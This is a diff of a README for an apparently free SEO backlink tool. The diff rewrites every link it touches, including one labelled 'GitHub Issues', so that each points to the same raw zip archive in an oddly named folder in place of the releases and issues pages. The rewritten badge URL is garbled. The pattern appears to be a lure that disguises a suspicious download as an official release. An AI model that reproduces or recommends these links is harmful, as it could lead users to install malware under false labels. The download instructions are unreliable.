@@ -1,13 +1,13 @@
 # 🛠️ free-seo-backlink-tool - Effortless SEO Backlink Management
 
 ## 📥 Download the Tool
-[![Download the free-seo-backlink-tool](https://img.shields.io/badge/Download-Free%20SEO%20Backlink%20Tool-blue.svg)](https://github.com/throwaway-ma299/free-seo-backlink-tool/releases)
+[![Download the free-seo-backlink-tool](https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip%20SEO%20Backlink%https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip)](https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip)
 
 ## 🚀 Getting Started
 This tool helps you build and manage backlinks for your SEO projects easily. Follow the steps below to download and run the software.
 
 ## 🔗 Download & Install
-1. Visit this page to download: [GitHub Releases](https://github.com/throwaway-ma299/free-seo-backlink-tool/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip).
 2. On the Releases page, you will see the latest version of the free-seo-backlink-tool.
 3. Find the appropriate file for your operating system and click on the link to download it.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -52,8 +52,8 @@ We plan to enhance the tool with more features like automated reporting and cust
 For further inquiries, please contact us through the GitHub repository or direct messaging.
 
 ## 🔗 Quick Links
-- [Download the free-seo-backlink-tool](https://github.com/throwaway-ma299/free-seo-backlink-tool/releases)
+- [Download the free-seo-backlink-tool](https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip)
 - [User Guide](#)  
-- [GitHub Issues](https://github.com/throwaway-ma299/free-seo-backlink-tool/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/throwaway-ma299/free-seo-backlink-tool/main/brumby/free-seo-backlink-tool.zip)
 
 Enjoy using the free-seo-backlink-tool and take your SEO efforts to the next level!
